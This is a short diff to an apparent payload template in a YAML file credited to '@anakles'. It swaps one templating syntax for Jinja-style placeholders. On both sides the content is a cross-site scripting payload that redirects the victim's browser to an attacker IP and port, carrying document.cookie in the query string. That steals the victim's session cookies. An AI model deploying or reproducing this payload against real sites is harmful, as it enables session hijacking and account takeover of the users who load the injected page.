@@ -6,4 +6,4 @@ metadata:
   author: "@anakles"
 
 content: |
-  <script type="text/javascript">document.location="http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/?c="+document.cookie;</script>
+  <script type="text/javascript">document.location="http://{{ attacker_ip }}:{{ delivery_outbound_port }}/?c="+document.cookie;</script>
